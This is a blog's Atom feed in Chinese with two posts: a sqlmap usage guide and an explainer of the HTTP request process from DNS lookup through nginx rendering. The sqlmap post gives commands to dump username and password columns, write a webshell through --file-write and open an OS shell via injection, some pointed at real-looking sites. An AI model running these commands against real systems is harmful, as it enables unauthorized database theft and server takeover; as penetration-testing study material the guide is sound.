<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guolala&#39;s blog</title>
  
  <subtitle>情迷不意乱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-01-07T02:18:55.040Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>guolala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqlmap使用详解</title>
    <link href="http://yoursite.com/2019/01/05/sqlmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/01/05/sqlmap使用详解/</id>
    <published>2019-01-05T09:01:21.000Z</published>
    <updated>2019-01-07T02:18:55.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLmap简介"><a href="#SQLmap简介" class="headerlink" title="SQLmap简介"></a>SQLmap简介</h1><ul><li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>4、联合查询注入，可以使用union的情况下的注入。</li><li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li></ul><h1 id="sqlmap支持的数据库"><a href="#sqlmap支持的数据库" class="headerlink" title="sqlmap支持的数据库"></a>sqlmap支持的数据库</h1><ul><li>MySQL</li><li>Oracle</li><li>PostgreSQL</li><li>Microsoft SQL Server</li><li>Microsoft Access</li><li>IBM DB2</li><li>SQLite</li><li>Firebird</li><li>Sybase</li><li>SAP MaxDB</li></ul><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”</code></pre><p>默认使用level1检测全部数据库类型</p><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3</code></pre><p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p><h2 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h2><p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，</p><p>当注入错误的时候，先报错再跳转的时候，不需要跟随302。</p><p>目的就是：要追踪到错误信息。</p><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>当程序有防get注入的时候，可以使用cookie注入</p><pre><code>sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）</code></pre><h2 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h2><p>可以使用burpsuite或者temperdata等工具来抓取post包</p><pre><code>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数</code></pre><h1 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h1><h2 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h2><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs</code></pre><p>查询有哪些数据库</p><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables</code></pre><p>查询test数据库中有哪些表</p><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns</code></pre><p>查询test数据库中admin表有哪些字段</p><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</code></pre><p>dump出字段username与password中的数据</p><p>其他命令参考下面</p><h2 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h2><pre><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code></pre><p>在dedecms数据库中搜索字段admin或者password。</p><h2 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h2><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><ul><li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</li><li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</li><li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li></ul><p>示例：</p><pre><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</code></pre><p>使用shell命令：</p><pre><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</code></pre><p>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”</p><p>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p><h1 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h1><ul><li>–is-dba 当前用户权限（是否为root权限）</li><li>–dbs 所有数据库</li><li>–current-db 网站当前数据库</li><li>–users 所有数据库用户</li><li>–current-user 当前数据库用户</li><li>–random-agent 构造随机user-agent</li><li>–passwords 数据库密码</li><li>–proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</li><li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li></ul><h2 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h2><ul><li>–version 显示程序的版本号并退出</li><li>-h, –help 显示此帮助消息并退出</li><li>-v VERBOSE 详细级别：0-6（默认为1）</li></ul><p>保存进度继续跑：</p><pre><code>sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</code></pre><h2 id="Target（目标）"><a href="#Target（目标）" class="headerlink" title="Target（目标）"></a>Target（目标）</h2><p>以下至少需要设置其中一个选项，设置目标URL。</p><ul><li>-d DIRECT 直接连接到数据库。</li><li>-u URL, –url=URL 目标URL。</li><li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li><li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li><li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li><li>-c CONFIGFILE 从INI配置文件中加载选项。</li></ul><h2 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h2><p>这些选项可以用来指定如何连接到目标URL。</p><ul><li>–data=DATA 通过POST发送的数据字符串</li><li>–cookie=COOKIE HTTP Cookie头</li><li>–cookie-urlencode URL 编码生成的cookie注入</li><li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li><li>–user-agent=AGENT 指定 HTTP User – Agent头</li><li>–random-agent 使用随机选定的HTTP User – Agent头</li><li>–referer=REFERER 指定 HTTP Referer头</li><li>–headers=HEADERS 换行分开，加入其他的HTTP头</li><li>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li><li>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</li><li>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）</li><li>–proxy=PROXY 使用HTTP代理连接到目标URL</li><li>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</li><li>–ignore-proxy 忽略系统默认的HTTP代理</li><li>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li><li>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</li><li>–retries=RETRIES 连接超时后重新连接的时间（默认3）</li><li>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li><li>–safe-url=SAFURL 在测试过程中经常访问的url地址</li><li>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</li></ul><h2 id="Enumeration（枚举）"><a href="#Enumeration（枚举）" class="headerlink" title="Enumeration（枚举）"></a>Enumeration（枚举）</h2><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p><ul><li>-b, –banner 检索数据库管理系统的标识</li><li>–current-user 检索数据库管理系统当前用户</li><li>–current-db 检索数据库管理系统当前数据库</li><li>–is-dba 检测DBMS当前用户是否DBA</li><li>–users 枚举数据库管理系统用户</li><li>–passwords 枚举数据库管理系统用户密码哈希</li><li>–privileges 枚举数据库管理系统用户的权限</li><li>–roles 枚举数据库管理系统用户的角色</li><li>–dbs 枚举数据库管理系统数据库</li><li>-D DBname 要进行枚举的指定数据库名</li><li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li><li>–tables 枚举的DBMS数据库中的表</li><li>–columns 枚举DBMS数据库表列</li><li>–dump 转储数据库管理系统的数据库中的表项</li><li>–dump-all 转储所有的DBMS数据库表中的条目</li><li>–search 搜索列（S），表（S）和/或数据库名称（S）</li><li>-C COL 要进行枚举的数据库列</li><li>-U USER 用来进行枚举的数据库用户</li><li>–exclude-sysdbs 枚举表时排除系统数据库</li><li>–start=LIMITSTART 第一个查询输出进入检索</li><li>–stop=LIMITSTOP 最后查询的输出进入检索</li><li>–first=FIRSTCHAR 第一个查询输出字的字符检索</li><li>–last=LASTCHAR 最后查询的输出字字符检索</li><li>–sql-query=QUERY 要执行的SQL语句</li><li>–sql-shell 提示交互式SQL的shell</li></ul><h2 id="Optimization（优化）"><a href="#Optimization（优化）" class="headerlink" title="Optimization（优化）"></a>Optimization（优化）</h2><p>这些选项可用于优化SqlMap的性能。</p><ul><li>-o 开启所有优化开关</li><li>–predict-output 预测常见的查询输出</li><li>–keep-alive 使用持久的HTTP（S）连接</li><li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li><li>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</li></ul><h2 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a>Injection（注入）</h2><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p><ul><li>-p TESTPARAMETER 可测试的参数（S）</li><li>–dbms=DBMS 强制后端的DBMS为此值</li><li>–os=OS 强制后端的DBMS操作系统为这个值</li><li>–prefix=PREFIX 注入payload字符串前缀</li><li>–suffix=SUFFIX 注入payload字符串后缀</li><li>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</li></ul><h2 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h2><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p><ul><li>–level=LEVEL 执行测试的等级（1-5，默认为1）</li><li>–risk=RISK 执行测试的风险（0-3，默认为1）</li><li>–string=STRING 查询时有效时在页面匹配字符串</li><li>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</li><li>–text-only 仅基于在文本内容比较网页</li></ul><h2 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h2><p>这些选项可用于调整具体的SQL注入测试。</p><ul><li>–technique=TECH SQL注入技术测试（默认BEUST）</li><li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li><li>–union-cols=UCOLS 定列范围用于测试UNION查询注入</li><li>–union-char=UCHAR 用于暴力猜解列数的字符</li></ul><h2 id="Fingerprint（指纹）"><a href="#Fingerprint（指纹）" class="headerlink" title="Fingerprint（指纹）"></a>Fingerprint（指纹）</h2><ul><li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li></ul><h2 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h2><p>这些选项可以被用来运行蛮力检查。</p><ul><li>–common-tables 检查存在共同表</li><li>–common-columns 检查存在共同列</li></ul><h2 id="User-defined-function-injection（用户自定义函数注入）："><a href="#User-defined-function-injection（用户自定义函数注入）：" class="headerlink" title="User-defined function injection（用户自定义函数注入）："></a>User-defined function injection（用户自定义函数注入）：</h2><p>这些选项可以用来创建用户自定义函数。</p><ul><li>–udf-inject 注入用户自定义函数</li><li>–shared-lib=SHLIB 共享库的本地路径</li></ul><h2 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h2><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><ul><li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</li><li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li><li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li></ul><h2 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h2><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><ul><li>–os-cmd=OSCMD 执行操作系统命令</li><li>–os-shell 交互式的操作系统的shell</li><li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li><li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li><li>–os-bof 存储过程缓冲区溢出利用</li><li>–priv-esc 数据库进程用户权限提升</li><li>–msf-path=MSFPATH Metasploit Framework本地的安装路径</li><li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li></ul><h2 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h2><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><ul><li>–reg-read 读一个Windows注册表项值</li><li>–reg-add 写一个Windows注册表项值数据</li><li>–reg-del 删除Windows注册表键值</li><li>–reg-key=REGKEY Windows注册表键</li><li>–reg-value=REGVAL Windows注册表项值</li><li>–reg-data=REGDATA Windows注册表键值数据</li><li>–reg-type=REGTYPE Windows注册表项值类型</li></ul><p>这些选项可以用来设置一些一般的工作参数。</p><ul><li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li><li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li><li>–flush-session 刷新当前目标的会话文件</li><li>–fresh-queries 忽略在会话文件中存储的查询结果</li><li>–eta 显示每个输出的预计到达时间</li><li>–update 更新SqlMap</li><li>–save file保存选项到INI配置文件</li><li>–batch 从不询问用户输入，使用所有默认配置。</li></ul><h2 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h2><ul><li>–beep 发现SQL注入时提醒</li><li>–check-payload IDS对注入payloads的检测测试</li><li>–cleanup SqlMap具体的UDF和表清理DBMS</li><li>–forms 对目标URL的解析和测试形式</li><li>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</li><li>–page-rank Google dork结果显示网页排名（PR）</li><li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li><li>–replicate 复制转储的数据到一个sqlite3数据库</li><li>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</li><li>–wizard 给初级用户的简单向导界面</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQLmap简介&quot;&gt;&lt;a href=&quot;#SQLmap简介&quot; class=&quot;headerlink&quot; title=&quot;SQLmap简介&quot;&gt;&lt;/a&gt;SQLmap简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。&lt;/li&gt;
&lt;li&gt;2
      
    
    </summary>
    
      <category term="渗透工具" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>一次完整的HTTP请求过程</title>
    <link href="http://yoursite.com/2019/01/02/%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/01/02/一次完整的HTTP请求过程/</id>
    <published>2019-01-02T13:14:42.000Z</published>
    <updated>2019-01-02T14:49:14.985Z</updated>
    
    <content type="html"><![CDATA[<p>当我们在游览器地址栏输入<a href="http://www.baidu.com，然后回车，回车这一瞬间页面到底发生了什么呢？" target="_blank" rel="noopener">www.baidu.com，然后回车，回车这一瞬间页面到底发生了什么呢？</a></p><p>域名解析 –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求 –&gt; 服务器响应http请求，浏览器得到html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等） –&gt; 浏览器对页面进行渲染呈现给用户</p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>首先游览器会解析<a href="http://www.baidu.com这个域名（准确来说应该是主机名）对应的IP地址。" target="_blank" rel="noopener">www.baidu.com这个域名（准确来说应该是主机名）对应的IP地址。</a></p><ol><li>游览器会首先搜索游览器自身的DNS缓存（缓存时间比较短，大概只有一分钟，且只能容纳1000条缓存），看自身的缓存中是否有<a href="http://www.baidu.com对应的条目，而且没有过期，如果有且没有过期则解析到此结束。【可以使用" target="_blank" rel="noopener">www.baidu.com对应的条目，而且没有过期，如果有且没有过期则解析到此结束。【可以使用</a> <code>chrome://net-internals/#dns</code> 来进行查看chrome缓存】</li><li>如果游览器自身的缓存没有找到相应条目，那么游览器会搜索操作系统自身的DNS缓存，如果找到且没有过期则停止搜索解析到此结束。【可以在命令行下使用 <code>ipconfig /displaydns</code> 来进行查看windows的DNS缓存】</li><li>如果在windows系统的DNS缓存也没有找到，那么尝试读取hosts文件（位于<code>C:\Windows\System32\drivers\etc</code>），看这里有没有该域名对应的IP地址，如果有则解析成功。</li><li>如果在hosts文件中也没有找到对应的条目，浏览器就会发起一个DNS的系统调用，就会向本地配置的首选DNS服务器（一般是电信运营商提供的，也可以使用像Google提供的DNS服务器）发起域名解析请求（<strong>通过的是UDP协议向DNS的53端口发起请求</strong>，这个请求是<strong>递归</strong>的请求，也就是运营商的DNS服务器必须得提供给我们该域名的IP地址），运营商的DNS服务器首先查找自身的缓存，找到对应的条目，且没有过期，则解析成功。如果没有找到对应的条目，则有运营商的DNS代我们的浏览器发起迭代DNS解析请求，它首先是会找根域的DNS的IP地址（这个DNS服务器都内置13台根域的DNS的IP地址），找打根域的DNS地址，就会向其发起请求（请问<a href="http://www.baidu.com这个域名的IP地址是多少啊？），根域发现这是一个顶级域com域的一个域名，于是就告诉运营商的DNS我不知道这个域名的IP地址，但是我知道com域的IP地址，你去找它去，于是运营商的DNS就得到了com域的IP地址，又向com域的IP地址发起了请求（请问www.baidu.com这个域名的IP地址是多少?）,com域这台服务器告诉运营商的DNS我不知道www.baidu.com这个域名的IP地址，但是我知道baidu.com这个域的DNS地址，你去找它去，于是运营商的DNS又向baidu.com这个域名的DNS地址（这个一般就是由域名注册商提供的，像万网，新网等）发起请求（请问www.baidu.com这个域名的IP地址是多少？），这个时候baidu.com域的DNS服务器一查，诶，果真在我这里，于是就把找到的结果发送给运营商的DNS服务器，这个时候运营商的DNS服务器就拿到了www.baidu.com这个域名对应的IP地址，并返回给Windows系统内核，内核又把结果返回给浏览器，终于浏览器拿到了www.baidu.com对应的IP地址。" target="_blank" rel="noopener">www.baidu.com这个域名的IP地址是多少啊？），根域发现这是一个顶级域com域的一个域名，于是就告诉运营商的DNS我不知道这个域名的IP地址，但是我知道com域的IP地址，你去找它去，于是运营商的DNS就得到了com域的IP地址，又向com域的IP地址发起了请求（请问www.baidu.com这个域名的IP地址是多少?）,com域这台服务器告诉运营商的DNS我不知道www.baidu.com这个域名的IP地址，但是我知道baidu.com这个域的DNS地址，你去找它去，于是运营商的DNS又向baidu.com这个域名的DNS地址（这个一般就是由域名注册商提供的，像万网，新网等）发起请求（请问www.baidu.com这个域名的IP地址是多少？），这个时候baidu.com域的DNS服务器一查，诶，果真在我这里，于是就把找到的结果发送给运营商的DNS服务器，这个时候运营商的DNS服务器就拿到了www.baidu.com这个域名对应的IP地址，并返回给Windows系统内核，内核又把结果返回给浏览器，终于浏览器拿到了www.baidu.com对应的IP地址。</a></li><li>如果依旧没有解析成功，那么在windows下会进行如下步骤</li><li>操作系统就会查找NetBIOS name Cache（NetBIOS名称缓存，就存在客户端电脑中的），那这个缓存有什么东西呢？凡是最近一段时间内和我成功通讯的计算机的计算机名和Ip地址，就都会存在这个缓存里面。什么情况下该步能解析成功呢？就是该名称正好是几分钟前和我成功通信过，那么这一步就可以成功解析。</li><li>如果第六步也没有成功，那会查询WINS 服务器（是NETBIOS名称和IP地址对应的服务器）。</li><li>如果第七步也没有查询成功，那么客户端就要进行广播查找。</li><li>如果第八步也没有成功，那么客户端就读取LMHOSTS文件（和HOSTS文件同一个目录下，写法也一样）</li></ol><p>如果第九步还没有解析成功，那么就宣告这次解析失败，那就无法跟目标计算机进行通信。只要这九步中有一步可以解析成功，那就可以成功和目标计算机进行通信。</p><h1 id="发起TCP的三次握手"><a href="#发起TCP的三次握手" class="headerlink" title="发起TCP的三次握手"></a>发起TCP的三次握手</h1><p>拿到域名对应的IP地址之后，User-Agent（一般指游览器）会以一个随机端口（1024&lt;端口&lt;65535）向服务器的WEB程序（常用的有httpd、nginx等）80端口发起TCP的连接请求。这个连接请求（原始的http请求经过TCP/IP四层模型的层层封包）到达服务器端后（这中间通过各种路由设备，局域网内除外），进入到网卡，然后是进入到内核的TCP/IP协议栈（用于识别该连接请求，解封包，一层一层的剥开），还有可能要经过Netfilter防火墙（属于内核的模块）的过滤，最终到达WEB程序，最终建立了TCP/IP连接。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fysm3nu3kej30vz0i3tat.jpg" alt=""></p><p>1） Client首先发送一个连接试探，ACK=0 表示确认号无效，SYN = 1 表示这是一个连接请求或连接接受报文，同时表示这个数据报不能携带数据，seq = x 表示Client自己的初始序号（seq = 0 就代表这是第0号包），这时候Client进入syn_sent状态，表示客户端等待服务器的回复</p><p>2） Server监听到连接请求报文后，如同意建立连接，则向Client发送确认。TCP报文首部中的SYN 和 ACK都置1 ，ack = x + 1表示期望收到对方下一个报文段的第一个数据字节序号是x+1，同时表明x为止的所有数据都已正确收到（ack=1其实是ack=0+1,也就是期望客户端的第1个包），seq = y 表示Server 自己的初始序号（seq=0就代表这是服务器这边发出的第0号包）。这时服务器进入syn_rcvd，表示服务器已经收到Client的连接请求，等待client的确认。</p><p>3） Client收到确认后还需再次发送确认，同时携带要发送给Server的数据。ACK 置1 表示确认号ack= y + 1 有效（代表期望收到服务器的第1个包），Client自己的序号seq= x + 1（表示这就是我的第1个包，相对于第0个包来说的），一旦收到Client的确认之后，这个TCP连接就进入Established状态，就可以发起http请求了。</p><h2 id="为什么TCP需要三次握手"><a href="#为什么TCP需要三次握手" class="headerlink" title="为什么TCP需要三次握手"></a>为什么TCP需要三次握手</h2><p>2个计算机通信是靠协议（目前流行的TCP/IP协议）来实现,如果2个计算机使用的协议不一样，那是不能进行通信的，所以这个3次握手就相当于试探一下对方是否遵循TCP/IP协议，协商完成后就可以进行通信了，当然这样理解不是那么准确。</p><h2 id="为什么HTTP协议要基于TCP来实现？"><a href="#为什么HTTP协议要基于TCP来实现？" class="headerlink" title="为什么HTTP协议要基于TCP来实现？"></a>为什么HTTP协议要基于TCP来实现？</h2><p>目前在Internet中所有的传输都是通过TCP/IP进行的，HTTP协议作为TCP/IP模型中应用层的协议也不例外，TCP是一个端到端的可靠的面向连接的协议，所以HTTP基于传输层TCP协议不用担心数据的传输的各种问题。</p><h1 id="建立TCP连接后发起http请求"><a href="#建立TCP连接后发起http请求" class="headerlink" title="建立TCP连接后发起http请求"></a>建立TCP连接后发起http请求</h1><p>进过TCP三次握手之后，浏览器发起了http的请求。</p><p>http请求报文内容和格式可自行抓包查看。</p><h1 id="服务器端响应http请求，浏览器得到html代码"><a href="#服务器端响应http请求，浏览器得到html代码" class="headerlink" title="服务器端响应http请求，浏览器得到html代码"></a>服务器端响应http请求，浏览器得到html代码</h1><p>服务器端WEB程序接收到http请求以后，就开始处理该请求，处理之后就返回给浏览器html文件。</p><h2 id="那到底服务器端接收到http请求后是怎么样生成html文件？"><a href="#那到底服务器端接收到http请求后是怎么样生成html文件？" class="headerlink" title="那到底服务器端接收到http请求后是怎么样生成html文件？"></a>那到底服务器端接收到http请求后是怎么样生成html文件？</h2><p>假设服务器端使用nginx+PHP(fastcgi)架构提供服务</p><h3 id="nginx读取配置文件"><a href="#nginx读取配置文件" class="headerlink" title="nginx读取配置文件"></a>nginx读取配置文件</h3><p>我们在浏览器的地址栏里面输入的是 <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> （http://可以不用输入，浏览器会自动帮我们添加），其实完整的应该是<a href="http://www.baidu.com./" target="_blank" rel="noopener">http://www.baidu.com./</a> 后面还有个点（这个点代表就是根域，一般情况下我们不用输入，也不显示）,后面的/也是不用添加，浏览器会自动帮我们添加，那么实际请求的URL是<a href="http://www.baidu.com/，那么好了Nginx在收到" target="_blank" rel="noopener">http://www.baidu.com/，那么好了Nginx在收到</a> 浏览器 GET / 请求时，会读取http请求里面的头部信息，根据Host来匹配 自己的所有的虚拟主机的配置文件的server_name,看看有没有匹配的，有匹配那么就读取该虚拟主机的配置，发现如下配置：</p><pre><code>root /web/echo</code></pre><p>通过这个就知道所有网页文件的就在这个目录下 这个目录就是/ 当我们<a href="http://www.baidu.com/时就是访问这个目录下面的文件，例如访问http://www.baidu.com/index.html,那么代表/web/echo下面有个文件叫index.html" target="_blank" rel="noopener">http://www.baidu.com/时就是访问这个目录下面的文件，例如访问http://www.baidu.com/index.html,那么代表/web/echo下面有个文件叫index.html</a></p><pre><code>index index.html index.htm index.php</code></pre><p>通过这个就能得知网站的首页文件是那个文件，也就是我们在入<a href="http://www.baidu.com/" target="_blank" rel="noopener">http://www.baidu.com/</a> ，nginx就会自动帮我们把index.html（假设首页是index.php 当然是会尝试的去找到该文件，如果没有找到该文件就依次往下找，如果这3个文件都没有找到，那么就抛出一个404错误）加到后面，那么添加之后的URL是/index.php,然后根据后面的配置进行处理。</p><pre><code>location ~ .*\.php(\/.*)*$ {   root /web/echo;   fastcgi_pass   127.0.0.1:9000;   fastcgi_index  index.php;   astcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;   include        fastcgi_params;}</code></pre><p>这一段配置指明凡是请求的URL中匹配（这里是启用了正则表达式进行匹配） *.php后缀的（后面跟的参数）都交给后端的fastcgi进程进行处理。</p><h3 id="把php文件交给fastcgi进程去处理"><a href="#把php文件交给fastcgi进程去处理" class="headerlink" title="把php文件交给fastcgi进程去处理"></a>把php文件交给fastcgi进程去处理</h3><p>于是nginx把/index.php这个URL交给了后端的fastcgi进程处理，等待fastcgi处理完成后（结合数据库查询出数据，填充模板生成html文件）返回给nginx一个index.html文档，Nginx再把这个index.html返回给浏览器，于是乎浏览器就拿到了首页的html代码，同时nginx写一条访问日志到日志文件中去。</p><h4 id="nginx是怎么找index-php文件的？"><a href="#nginx是怎么找index-php文件的？" class="headerlink" title="nginx是怎么找index.php文件的？"></a>nginx是怎么找index.php文件的？</h4><p>当nginx发现需要/web/echo/index.php文件时，就会向内核发起IO系统调用(因为要跟硬件打交道，这里的硬件是指硬盘，通常需要靠内核来操作，而内核提供的这些功能是通过系统调用来实现的)，告诉内核，我需要这个文件,内核从/开始找到web目录，再在web目录下找到echo目录，最后在echo目录下找到index.php文件，于是把这个index.php从硬盘上读取到内核自身的内存空间，然后再把这个文件复制到nginx进程所在的内存空间，于是乎nginx就得到了自己想要的文件了。</p><h1 id="浏览器解析html代码，并请求html代码中的资源"><a href="#浏览器解析html代码，并请求html代码中的资源" class="headerlink" title="浏览器解析html代码，并请求html代码中的资源"></a>浏览器解析html代码，并请求html代码中的资源</h1><p>浏览器拿到index.html文件后，就开始解析其中的html代码，遇到js/css/image等静态资源时，就向服务器端去请求下载（会使用多线程下载，每个浏览器的线程数不一样），这个时候就用上keep-alive特性了，建立一次HTTP连接，可以请求多个资源，下载资源的顺序就是按照代码里的顺序，但是由于每个资源大小不一样，而浏览器又多线程请求请求资源，所以顺序并不一定是代码里面的顺序。</p><p>浏览器在请求静态资源时（在未过期的情况下），向服务器端发起一个http请求（询问自从上一次修改时间到现在有没有对资源进行修改），如果服务器端返回304状态码（告诉浏览器服务器端没有修改），那么浏览器会直接读取本地的该资源的缓存文件。</p><h1 id="浏览器对页面进行渲染呈现给用户"><a href="#浏览器对页面进行渲染呈现给用户" class="headerlink" title="浏览器对页面进行渲染呈现给用户"></a>浏览器对页面进行渲染呈现给用户</h1><p>最后，浏览器利用自己内部的工作机制，把请求到的静态资源和html代码进行渲染，渲染之后呈现给用户。</p><p>自此一次完整的HTTP事务宣告完成.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;当我们在游览器地址栏输入&lt;a href=&quot;http://www.baidu.com，然后回车，回车这一瞬间页面到底发生了什么呢？&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.baidu.com，然后回车，回车这一瞬间页面到底发生了什么呢？&lt;/a&gt;
      
    
    </summary>
    
      <category term="网络及协议" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/"/>
    
    
  </entry>
  
  <entry>
    <title>入侵检测与入侵防御</title>
